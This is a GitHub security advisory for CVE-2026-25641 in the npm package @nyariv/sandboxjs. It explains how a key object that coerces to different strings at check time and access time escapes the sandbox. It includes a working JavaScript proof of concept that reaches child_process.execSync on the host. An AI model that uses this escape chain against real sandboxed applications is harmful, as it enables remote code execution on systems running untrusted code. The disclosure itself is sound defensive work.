# [C] @nyariv/sandboxjs vulnerable to sandbox escape via TOCTOU bug on keys in property accesses

## Summary
Severity: Critical
Advisory: GHSA-7x3h-rm86-3342
CVE: CVE-2026-25641
CWE: CWE-367, CWE-74
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-02-05
Source: https://github.com/advisories/GHSA-7x3h-rm86-3342
Type: github-advisory

## Affected
- npm: `@nyariv/sandboxjs` — affected >=0 <0.8.29

## Details
### Summary
A sandbox escape vulnerabilities due to a mismatch between the key on which the validation is performed and the key used for accessing properties.

### Details
Even though the key used in property accesses (```b``` in the code below) is annotated as ```string```, this is never enforced:
https://github.com/nyariv/SandboxJS/blob/6103d7147c4666fe48cfda58a4d5f37005b43754/src/executor.ts#L304-L304
So, attackers can pass malicious objects that coerce to different string values when used, e.g., one for the time the key is sanitized using ```hasOwnProperty(key)``` and a different one for when the key is used for the actual property access.

### PoC
```js
const Sandbox = require('@nyariv/sandboxjs').default;

const code = `
let a = new Map;
a.x = 23;
let count = 0;

let nastyProp = {toString: () => {if (count<1){count++;return "x"} else return "__proto__"}}
let mapProt = a[nastyProp];
mapProt.has = isFinite;
console.log(
  isFinite.constructor(
    "return process.getBuiltinModule('child_process').execSync('ls -lah').toString()",
  )(),
);`;
const scope = {};
const sandbox = new Sandbox();
const exec = sandbox.compile(code);
exec(scope).run(); 
```

### Impact
Remote code execution, if attacker can execute code inside the sandbox.

## References
- https://github.com/nyariv/SandboxJS/security/advisories/GHSA-7x3h-rm86-3342
- https://nvd.nist.gov/vuln/detail/CVE-2026-25641
- https://github.com/nyariv/SandboxJS/commit/67cb186c41c78c51464f70405504e8ef0a6e43c3
- https://github.com/nyariv/SandboxJS
- https://github.com/nyariv/SandboxJS/blob/6103d7147c4666fe48cfda58a4d5f37005b43754/src/executor.ts#L304-L304
